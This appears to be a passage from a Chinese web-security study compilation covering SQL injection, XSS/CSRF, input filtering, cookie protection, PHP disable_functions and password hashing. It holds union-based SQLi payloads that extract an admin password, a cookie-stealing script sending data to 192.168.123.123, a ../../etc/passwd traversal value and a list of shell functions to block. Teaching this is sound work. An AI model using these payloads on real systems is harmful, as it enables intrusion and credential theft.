在得知列数后，便可以开启真正的掠夺了。那就是在原本的查询结果中加入自己的查询数据。如下图所示，将地址栏中

id=2
改为

id=2 union select 1,2,3,4,5,6,7,8,9,10

这样变化的意图是什么？举个例子，假如下图所示查询数据为网站本来正常的查询结果，id=852，从左至右刚好10列数据。

而加入union select 1,2,3,4,5,6,7,8,9,10后，查询结果便如下图所示。多出了一行结果为1 2 3 4 5 6 7 8 9 10的数据。

而网站中这行多出来的数据没有显示在页面上的原因是什么？可以想像，网站在获取到两行数据后只取了第一行的数据，因为网站根本没预料到会有两行以上的数据。那么我们只需要将自己的数据排到第一行，就可以替代网站本身的数据了。于是再做一次排序，继续追加一句order by 1，根据第一列的值进行排序，便产生如下结果

可以看到，我们自己的数据排到了最前面，这是因为我们自己构建的数据中，第一列的值为1，小于上图示例数据852，于是排到了前面。

随后拿到网站中测试，将

id=2
改为

id=2 union select 1,2,3,4,5,6,7,8,9,10 order by 1
可以看到，我们的内容替换掉了网站内容，第二列数据值2与第6列数据值6显示在了网站页面。

这两列显示数据便成了数据输出窗口。换言之，只需要将2和6的值替换为数据库实际内容，就可以输出到页面显示，被我们看见。

得知第2列和第6列会显示后，便可以开始尝试将2和6替换为系统表数据，将前面的

id=2 union select 1,2,3,4,5,6,7,8,9,10 order by 1
更改为

id=2 union select 1,table_schema,3,4,5,table_name,7,8,9,10 from information_schema.columns order by 1

这句表示，我们自己追加的数据不再是单纯的10个数字，而是从mysql的系统表columns中查询的数据，第二列与第六列分别显示columns表中的table_schema列与table_name列数据。table_schema列存储的是数据库名字信息，table_name列存储着表名信息。下图查询到的数据库名为information_schema，表名为character_sets

上面查询的columns表是mysql的系统表，里面存储着mysql中所有的表名及列信息，如下图的本机展示可以看到所有的表名，列名，列的数据类型，通过这个表，可以爆出所有的表名，列名，及所在数据库，是获取数据的突破口。

下图是一个本机测试，用的是前面爆网站表名的语句：

select ### from table1 where id=852 union select 1,table_schema,3,4,5,table_name,7,8,9,10 from information_schema.columns order by 1
可以看到，所有的表列数据被追加到我们自己的数据里，做个对比的话，下图最后一列数据就像网站正常显示的数据，其他的则是我们注入的数据。

那么如何把这么多行数据逐个爆出来呢？很明显依靠排序是不足以实现的，这时可以再在之前的查询语句后追加一个limit条件，如下图所示

limit m,n
表示筛选出从第m+1行开始的n行数据

limit 0,1
便表示筛选出第一行开始的一行数据，这样如下图就得到了第一行数据，换成limit 1,1则是筛选出第二行数据，以此类推，可以分别得出每一行的数据。

应用到网站中，发现从第41行开始不再是系统表，如下图所示，第41行爆出了数据库名sq_sydata，表名sy_admin

一行一行爆，如图展示，更改limit限定值会爆出其他的表名。

最后爆出了所有的表，如下图所示。

按照命名推断，sy_admin表必定是后台管理员账号表，既然columns系统表中存放着所有列信息，自然也可以用来将sy_admin表的列名爆出来，将

id=2 union select 1,table_schema,3,4,5,table_name,7,8,9,10 from information_schema.columns order by 1
中的table_schema（数据库名）替换为table_name（表名），table_name（表名）替换为column_name（列名），再尝试更改limit的限定值，直到更改为480時开始出现sy_admin表的内容，下图可以看到第481列（limit 480,1）爆出了sy_admin表的一个列名为id。

继续递增列爆481，得到列名loginname。

继续递增，最终爆出sy_admin表的所有列名，如下图所示。

可以推断，上图中的lpginname列应该是用户名，password则是登录密码。

ok，已经得到了sy_admin表的所有列名，接下来就可以开始获取sy_admin表中的实际数据了。

然后我们不再查询系统表，转向sy_admin表，如下图所示，将第二列替换为loginname，第六列替换为password，表名从系统表information_schema.columns（information_schema数据库中的columns表）更换为sq_sydata.sy_admin（sq_sydata数据库中的sy_admin表），再稍微更换limit限定条件，最终得到了后台管理员admin的密码，如下图所示

目标达成。

上图中加密后的密码可以通过工具或百度在线md5解密工具解密，不作赘述。

同样也可以更换列名查出其他的信息，比如下图所示登录次数27次，上次登录于2月1号。以及其他的东西，你懂的。
```
### xss攻击怎么防止
```
XSS又称CSS，全称Cross SiteScript(跨站脚本攻击)， XSS攻击类似于SQL注入攻击，
是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。
其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当用户浏览该网站时，
这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie信息、破坏页面结构
常见的恶意字符XSS输入：
1. XSS 输入通常包含 JavaScript 脚本，如弹出恶意警告框：
`<script>alert("XSS");</script>`
2. XSS 输入也可能是 HTML 代码段，譬如：
    (1) 网页不停地刷新 `<meta http-equiv="refresh" content="0;">`
    (2) 嵌入其它网站的链接，重定向到其它网站等。
方法：利用php htmlentities()函数
php防止XSS跨站脚本攻击的方法：是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数。
```

### XSS 与 CSRF
```
用大白话谈谈XSS与CSRF
csrfxssjavascript安全
发布于 2016-10-01
这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。
XSS与CSRF这两个关键词时常被拉出来一起比较（尤其是面试），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络。

这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解。

国际惯例，先上一下维基百科：

XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
I
CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

维基的解释依旧高深莫测啊，我用 “人话”给大家解释一下吧。

XSS： 通过客户端脚本语言（最常见如：JavaScript）
在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！

CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。

很多同学会搞不明白XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。
XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。

通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。
XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。

简单来说，条条大路（XSS路，命令行路）通罗马（CSRF马，XSRF马）。

前面讲了那么多理论介绍，那么我们来看一看实际代码吧。

【 Talk is cheap，Show me the code 】

场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了（各种姿势混着玩~）

如下：

while(true){
    alert('你关不掉我');
}

这个就是最原始的脚本注入了。
用户进来就麻烦了，一直弹窗一直弹窗。

那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：


// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
此段代码携带着cookie信息传输给了 http://192.168.123.123/myxss/... 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。

有没感觉到背后一寒

看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），=
既然此段脚本注入能携带着用户信息到收集服务器，那么再研究研究，他自然能发邮件？发帖？一系列业务逻辑？ ~~当然可以！。

这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。

那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：
一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X" ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！

XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。

今天国庆日，6天后国足将在西安迎战叙利亚，此战胜负十分关键！祝好运！国足队员加油！

参考文章：
https://segmentfault.com/a/11... 《 总结 XSS 与 CSRF 两种跨站攻击 》
http://www.lxway.com/48228121... 《CSRF CORS》
```

### 输入过滤
```

过滤输入
过滤是Web应用安全的基础。它是你验证数据合法性的过程。通过在输入时确认对所有的数据进行过滤，你可以避免被污染（未过滤）数据在你的程序中被误信及误用。大多数流行的PHP应用的漏洞最终都是因为没有对输入进行恰当过滤造成的。


我所指的过滤输入是指三个不同的步骤：


l 识别输入

l 过滤输入

l 区分已过滤及被污染数据


把识别输入做为第一步是因为如果你不知道它是什么，你也就不能正确地过滤它。输入是指所有源自外部的数据。例如，所有发自客户端的是输入，但客户端并不是唯一的外部数据源，其它如数据库和RSS推送等也是外部数据源。

由用户输入的数据非常容易识别，PHP用两个超级公用数组$_GET 和$_POST来存放用户输入数据。其它的输入要难识别得多，例如，$_SERVER数组中的很多元素是由客户端所操纵的。常常很难确认$_SERVER数组中的哪些元素组成了输入，所以，最好的方法是把整个数组看成输入。

在某些情况下，你把什么作为输入取决于你的观点。例如，session数据被保存在服务器上，你可能不会认为session数据是一个外部数据源。如果你持这种观点的话，可以把session数据的保存位置是在你的软件的内部。意识到session的保存位置的安全与软件的安全是联系在一起的事实是非常明智的。同样的观点可以推及到数据库，你也可以把它看成你软件的一部分。

一般来说，把session保存位置与数据库看成是输入是更为安全的，同时这也是我在所有重要的PHP应用开发中所推荐的方法。

一旦识别了输入，你就可以过滤它了。过滤是一个有点正式的术语，它在平时表述中有很多同义词，如验证、清洁及净化。尽管这些大家平时所用的术语稍有不同，但它们都是指的同一个处理：防止非法数据进入你的应用。

有很多种方法过滤数据，其中有一些安全性较高。最好的方法是把过滤看成是一个检查的过程。请不要试图好心地去纠正非法数据，要让你的用户按你的规则去做，历史证明了试图纠正非法数据往往会导致安全漏洞。例如，考虑一下下面的试图防止目录跨越的方法（访问上层目录）。


CODE:


1

2

3

4

5

6


  

  $filename = str_replace('..', '.',

$_POST['filename']);

  

  ?>




你能想到$_POST['filename']如何取值以使$filename成为Linux系统中用户口令文件的路径../../etc/passwd吗？


答案很简单：

1

.../.../etc/passwd



这个特定的错误可以通过反复替换直至找不到为止：


CODE:


1

2

3

4

5

6

7

8

9

  
  $filename = $_POST['filename'];

  while (strpos($_POST['filename'], '..') !=  =

FALSE)

  {

    $filename = str_replace('..', '.',

$filename);

  }

  ?>




当然，函数basename( )可以替代上面的所有逻辑，同时也能更安全地达到目的。不过重要点是在于任何试图纠正非法数据的举动都可能导致潜在错误并允许非法数据通过。只做检查是一个更安全的选择。


译注：这一点深有体会，在实际项目曾经遇到过这样一件事，是对一个用户注册和登录系统进行更改，客户希望用户名前后有空格就不能登录，结果修改时对用户登录程序进行了更改，用trim（）函数把输入的用户名前后的空格去掉了（典型的好心办坏事），但是在注册时居然还是允许前后有空格！结果可想而知。

除了把过滤做为一个检查过程之外，你还可以在可能时用白名单方法。它是指你需要假定你正在检查的数据是非法的，除非你能证明它是合法的。换而言之，你宁可在小心上犯错。使用这个方法，一个错误只会导致你把合法的数据当成是非法的。尽管不想犯任何错误，但这样总比把非法数据当成合法数据要安全得多。通过减轻犯错引起的损失，你可以提高你的应用的安全性。尽管这个想法在理论上是很自然的，但历史证明，这是一个很有价值的方法。

如果你能正确可靠地识别和过滤输入，你的工作就基本完成了。最后一步是使用一个命名约定或其它可以帮助你正确和可靠地区分已过滤和被污染数据的方法。我推荐一个比较简单的命名约定，因为它可以同时用在面向过程和面向对象的编程中。我用的命名约定是把所有经过滤的数据放入一个叫$clean的数据中。你需要用两个重要的步骤来防止被污染数据的注入：


l 经常初始化$clean为一个空数组。

l 加入检查及阻止来自外部数据源的变量命名为clean，


实际上，只有初始化是至关紧要的，但是养成这样一个习惯也是很好的：把所有命名为clean的变量认为是你的已过滤数据数组。这一步骤合理地保证了$clean中只包括你有意保存进去的数据，你所要负责的只是不在$clean存在被污染数据。


为了巩固这些概念，考虑下面的表单，它允许用户选择三种颜色中的一种；

CODE:


1

2

3

4

5

6

7

8

9

10

11



  Please select a color:

  

  

  





在处理这个表单的编程逻辑中，非常容易犯的错误是认为只能提交三个选择中的一个。在第二章中你将学到，客户端能提交任何数据作为$_POST['color']的值。为了正确地过滤数据，你需要用一个switch语句来进行：

CODE:


1

2

3

4

5

6

7

8

9

10

11

12

13


 

$clean = array(  );

switch($_POST['color'])

{

  case 'red':

  case 'green':

  case 'blue':

    $clean['color'] = $_POST['color'];

    break;

}

 

?>



本例中首先初始化了$clean为空数组以防止包含被污染的数据。一旦证明$_POST['color']是red, green, 或blue中的一个时，就会保存到$clean['color']变量中。因此，可以确信$clean['color']变量是合法的，从而在代码的其它部分使用它。当然，你还可以在switch结构中加入一个default分支以处理非法数据的情况。一种可能是再次显示表单并提示错误。特别小心不要试图为了友好而输出被污染的数据。

上面的方法对于过滤有一组已知的合法值的数据很有效，但是对于过滤有一组已知合法字符组成的数据时就没有什么帮助。例如，你可能需要一个用户名只能由字母及数字组成：


CODE:


1

2

3

4

5

6

7

8

9

10


 

 $clean = array(  );

 

 if (ctype_alnum($_POST['username']))

 {

   $clean['username'] = $_POST['username'];

 }

 

 ?>



尽管在这种情况下可以用正则表达式，但使用PHP内置函数是更完美的。这些函数包含错误的可能性要比你自已写的代码出错的可能性要低得多，而且在过滤逻辑中的一个错误几乎就意味着一个安全漏洞。
https://www.php.cn/php-weizijiaocheng-353044.html
```

### Cookie 安全
```
https://www.jb51.net/article/84106.htm
本文实例讲述了php用户登录之cookie信息安全。分享给大家供大家参考，具体如下：

大家都知道用户登陆后，用户信息一般会选择保存在cookie里面，因为cookie是保存客户端，并且cookie可以在客户端用浏览器自由更改，这样将会造成用户cookie存在伪造的危险，从而可能使伪造cookie者登录任意用户的账户。

下面就说说平常一些防止用户登录cookie信息安全的方法：

一、cookie信息加密法

cookie信息加密法即用一种加密方法，加密用户信息，然后在存入cookie，这样伪造者即使得到cookie也只能在cookie有效期内对这个cookie利用，无法另外伪造cookie信息。

这里附上一个加密函数：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
<?php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
  // 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙
  $ckey_length = 4;
  // 密匙
  $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);
  // 密匙a会参与加解密
  $keya = md5(substr($key, 0, 16));
  // 密匙b会用来做数据完整性验证
  $keyb = md5(substr($key, 16, 16));
  // 密匙c用于变化生成的密文
  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length):
substr(md5(microtime()), -$ckey_length)) : '';
  // 参与运算的密匙
  $cryptkey = $keya.md5($keya.$keyc);
  $key_length = strlen($cryptkey);
  // 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，
//解密时会通过这个密匙验证数据完整性
  // 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确
  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) :
sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
  $string_length = strlen($string);
  $result = '';
  $box = range(0, 255);
  $rndkey = array();
  // 产生密匙簿
  for($i = 0; $i <= 255; $i++) {
    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
  }
  // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度
  for($j = $i = 0; $i < 256; $i++) {
    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
    $tmp = $box[$i];
    $box[$i] = $box[$j];
    $box[$j] = $tmp;
  }
  // 核心加解密部分
  for($a = $j = $i = 0; $i < $string_length; $i++) {
    $a = ($a + 1) % 256;
    $j = ($j + $box[$a]) % 256;
    $tmp = $box[$a];
    $box[$a] = $box[$j];
    $box[$j] = $tmp;
    // 从密匙簿得出密匙进行异或，再转成字符
    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
  }
  if($operation == 'DECODE') {
    // 验证数据有效性，请看未加密明文的格式
    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() --> 0) &&
substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
      return substr($result, 26);
    } else {
      return '';
    }
  } else {
    // 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因
    // 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码
    return $keyc.str_replace('=', '', base64_encode($result));
  }
}
$str = 'abcdef';
$key = 'www.jb51.net';
echo $jm = authcode($str,'ENCODE',$key,0); //加密
echo "
";
echo authcode($jm ,'DECODE',$key,0); //解密
?>
这样当设置用户信息的cookie时，就无法对其进行伪造：

1
2
3
4
5
6
<?php
$user = array("uid"=-->$uid,"username"=>$username);
$user = base64_encode(serialize($user));
$user = authcode($user,'ENCODE','www.jb51.net',0); //加密
setcookie("user",$user,time()+3600*24);
?>
二、用加密令牌对cookie进行保护

1
2
3
4
5
$hash = md5($uid.time());//加密令牌值
$hash_expire =time()+3600*24;//加密令牌值为一天有效期
$user = array("uid"=>$uid,"username"=>$username,"hash"=>$hash);
$user = base64_encode(serialize($user));
setcookie("user",$user,$hash_expr);
然后把$hash和$hash_expire 存入member表中hash和hash_expire对应字段中,也可以存入nosql，session

用户伪造cookie时，hash无法伪造,伪造的hash和数据库中的不一致

用户每次登陆，这个hash_expire有效期内不更新hash值，过期则更新
```

### 禁用 `mysql_` 系函数
```
https://www.jb51.net/article/89240.htm
php禁用函数设置及查看方法详解
 更新时间：2016年07月25日 16:04:59   转载 作者：宰相秋水  
这篇文章主要介绍了php禁用函数设置及查看方法,结合实例形式分析了php禁用函数的方法及使用php探针查看禁用函数信息的相关实现技巧,需要的朋友可以参考下

 
本文实例讲述了php禁用函数设置及查看方法。分享给大家供大家参考，具体如下：

打开PHP.INI，找到这行：

disable_functions =

在后面那里加上要禁用的函数，如禁用多个函数，要用半角逗号 , 分开

给个例子：
复制代码代码如下:
disable_functions = passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh
ellcmd,escapeshellarg,shell_exec,proc_open,proc_get_status
建议在主机上禁用的函数：
复制代码代码如下:
disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname

在主机上面如何查看禁用的函数列表，我从网上找了一个非常不错的探针
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
<?php
header("content-Type: text/html; charset=utf-8");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
error_reporting(0);
ob_end_flush();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Pragma" content="No-cache" />
<meta http-equiv="Expires" content="0" />
<meta http-equiv="cache-control" content="private" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />//加了这句，看看能不能解决linux下显示乱码的问题？
<title>PHP 探针 v1.0</title>
<style type="text/css">
<!--
body{text-align:center;margin-top:20px;background-color:#a9b674;}
#overview{width:700px;margin:0 auto;text-align:left;}
a{text-decoration:underline;color:#992700;}
.strong{color:#992700;}
.basew{width:300px;}
-->
</style>
</head>
<body>
<div id="overview">
<div id="copyright">版权信息
<a href="hello.php?typ=baseinfo">[基本信息]</a> <a href="hello.php?typ=superinfo">[高级信息]</a>
<?php
if (function_exists("phpinfo")){
  echo'<a href="hello.php?typ=phpinfo">[phpinfo]</a>';}
echo'<br />php探针v1.0 by MKDuse(blueidea-id)<br /><br />此程序代码，可免费使用；但不得用于商业用途；完全转载或使用此代码，请保留版权信息；<br />欢迎指正错误提建议，QQ：122712355</div>';
if (empty($_GET['typ'])){
  baseinfo();}
else{
switch ($_GET['typ']){
case 'phpinfo':
phpinfoview();
break;
case 'superinfo':
superinfo();
break;
case 'baseinfo':
baseinfo();
break;
default:
baseinfo();}
}
function getime()
{
 $t = gettimeofday();
 return (float)($t['sec'] + $t['usec']/1000000);
}
function baseinfo(){
echo '<h1>基本信息</h1>';
$arr[]=array("Current PHP version:",phpversion());
$arr[]=array("Zend engine version:",zend_version());
$arr[]=array("服务器版本",$_SERVER['SERVER_SOFTWARE']);
$arr[]=array("ip地址",$_SERVER['REMOTE_HOST']);//ip
$arr[]=array("域名",$_SERVER['HTTP_HOST']);
$arr[]=array("协议端口",$_SERVER['SERVER_PROTOCOL'].' '.$_SERVER['SERVER_PORT']);
$arr[]=array("站点根目录",$_SERVER['PATH_TRANSLATED']);
$arr[]=array("服务器时间",date('Y年m月d日,H:i:s,D'));
$arr[]=array("当前用户",get_current_user());
$arr[]=array("操作系统",php_uname('s').php_uname('r').php_uname('v'));
$arr[]=array("include_path",ini_get('include_path'));
$arr[]=array("Server API",php_sapi_name());
$arr[]=array("error_reporting level",ini_get("display_errors"));
$arr[]=array("POST提交限制",ini_get('post_max_size'));
$arr[]=array("upload_max_filesize",ini_get('upload_max_filesize'));
$arr[]=array("脚本超时时间",ini_get('max_execution_time').'秒');
if (ini_get("safe_mode")==0){
$arr[]=array("PHP安全模式(Safe_mode)",'off');}
else{
$arr[]=array("PHP安全模式(Safe_mode)",'on');}
if (function_exists('memory_get_usage')){
$arr[]=array("memory_get_usage",ini_get('memory_get_usage'));}
//$arr[]=array("可用空间",intval(diskfreespace('/')/(1024 * 1024))."M");
echo'<table>';
for($i=0;$i<count($arr);$i++)
{
  $overview='<tr><td class="basew">'.$arr[$i][0].'</td><td>'.$arr[$i][1].'</td></tr>';
  echo $overview;
}
echo'</table>';
echo '<h2>服务器性能测试</h2>';
echo'<table><tr><td>服务器</td><td>整数运算<br />50万次加法(1+1)</td><td>浮点运算<br />50万次平方根(3.14开方)</td></tr>';
echo'<tr><td>MKDuse的机子(P4 1.5G 256DDR winxp sp2)</td><td>465.08ms</td><td>466.66ms</td></tr>';
$time_start=getime();
for($i=0;$i<=500000;$i++);
{$count=1+1;}
$timea=round((getime()-$time_start)*1000,2);
echo '<tr class="strong"><td>当前服务器</td><td>'.$timea.'ms</td>';
$time_start=getime();
for($i=0;$i<=500000;$i++);
{sqrt(3.14);}
$timea=round((getime()-$time_start)*1000,2);
echo '<td>'.$timea.'ms</td></tr></table>';
?>
<script language="javascript" type="text/javascript">
function gettime()
{
 var time;
 time=new Date();
 return time.getTime();
}
start_time=gettime();
</script>
<?php
echo '<h2>带宽测试</h2>';
for ($i=0;$i<100;$i++){
print "<!--1234567890#########0#########0#########0#########0#########0#########0#########0#########012345-->";}
?>
<p id="dk"></p>
<script language="javascript" type='text/javascript'>
var timea;
var netspeed;
timea=gettime()-start_time;
netspeed=Math.round(10/timea*1000);
document.getElementByIdx("dk").innerHTML="向客户端发送10KB数据，耗时"+timea+"ms<br />您与此服务器的连接速度为"+netspeed+"kb/s";
</script>
<?php
echo'<h2>已加载的扩展库(enable)</h2><div>';
$arr =get_loaded_extensions();
foreach($arr as $value){
  echo $value.'<br />';}
echo'</div><h2>禁用的函数</h2><p>';
$disfun=ini_get('disable_functions');
if (empty($disfun)){
  echo'没有禁用</p>';}
else{
echo ini_get('disable_functions').'</p>';}
}//关闭
function superinfo(){
echo'<h1>高级信息</h1><p>PHP_INI_USER 1 配置选项可用在用户的 PHP 脚本或Windows 注册表中<br> PHP_INI_PERDIR 2 配置选项可在 php.ini, .htaccess 或 httpd.conf 中设置 <br>PHP_INI_SYSTEM 4 配置选项可在 php.ini or httpd.conf 中设置 <br>PHP_INI_ALL 7 配置选项可在各处设置</p>';
$arr1=ini_get_all();
for ($i=0;$i<count($arr1);$i++)
  {
$arr2=array_slice($arr1,$i,1);
print_r($arr2);
echo '<br />';
}
}
function phpinfoview(){
  phpinfo();
}
?>
</div>
</body>
</html>
更多关于PHP相关内容感兴趣的读者可查看本站专
```

### 数据库存储用户密码时，应该是怎么做才安全
```
https://www.cnblogs.com/milantgh/p/3612318.html
如何安全的存储用户的密码
大多数的web开发者都会遇到设计用户账号系统的需求。账号系统最重要的一个方面就是如何保护用户的密码。一些大公司的用户数据库泄露事件也时有发生，所以我们必须采取一些措施来保护用户的密码，即使网站被攻破的情况下也不会造成较大的危害。如果你还在存储用户密码的MD5,那可真的有点弱了。赶紧来看看这篇文章吧。

保护密码最好的的方式就是使用带盐的密码hash(salted password hashing).对密码进行hash操作是一件很简单的事情，但是很多人都犯了错。接下来我希望可以详细的阐述如何恰当的对密码进行hash，以及为什么要这样做。

重要提醒
如果你打算自己写一段代码来进行密码hash，那么赶紧停下吧。这样太容易犯错了。这个提醒适用于每一个人，不要自己写密码的hash算法 ！关于保存密码的问题已经有了成熟的方案，那就是使用phpass或者本文提供的源码。

什么是hash

hash("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
hash("hbllo") = 58756879c05c68dfac9866712fad6a93f8146f337a69afe7dd238f3364946366
hash("waltz") = c0e81794384491161f1777c232bc6bd9ec38f616560b120fda8e90f383853542
Hash算法是一种单向的函数。它可以把任意数量的数据转换成固定长度的“指纹”，这个过程是不可逆的。而且只要输入发生改变，哪怕只有一个bit，输出的hash值也会有很大不同。这种特性恰好合适用来用来保存密码。因为我们希望使用一种不可逆的算法来加密保存的密码，同时又需要在用户登陆的时候验证密码是否正确。

在一个使用hash的账号系统中，用户注册和认证的大致流程如下：

1, 用户创建自己的账号 
2, 用户密码经过hash操作之后存储在数据库中。没有任何明文的密码存储在服务器的硬盘上。 
3, 用户登陆的时候，将用户输入的密码进行hash操作后与数据库里保存的密码hash值进行对比。 
4, 如果hash值完全一样，则认为用户输入的密码是正确的。否则就认为用户输入了无效的密码。 
5, 每次用户尝试登陆的时候就重复步骤3和步骤4。
在步骤4的时候不要告诉用户是账号还是密码错了。只需要显示一个通用的提示，比如账号或密码不正确就可以了。这样可以防止攻击者枚举有效的用户名。

还需要注意的是用来保护密码的hash函数跟数据结构课上见过的hash函数不完全一样。比如实现hash表的hash函数设计的目的是快速，但是不够安全。只有加密hash函数(cryptographic hash functions)可以用来进行密码的hash。这样的函数有SHA256, SHA512, RipeMD, WHIRLPOOL等。

一个常见的观念就是密码经过hash之后存储就安全了。这显然是不正确的。有很多方式可以快速的从hash恢复明文的密码。还记得那些md5破解网站吧，只需要提交一个hash，不到一秒钟就能知道结果。显然，单纯的对密码进行hash还是远远达不到我们的安全需求。下一部分先讨论一下破解密码hash，获取明文常见的手段。

如何破解hash
字典和暴力破解攻击(Dictionary and Brute Force Attacks)
最常见的破解hash手段就是猜测密码。然后对每一个可能的密码进行hash，对比需要破解的hash和猜测的密码hash值，如果两个值一样，那么之前猜测的密码就是正确的密码明文。猜测密码攻击常用的方式就是字典攻击和暴力攻击。

Dictionary Attack

Trying apple        : failed
Trying blueberry    : failed
Trying justinbeiber : failed
...
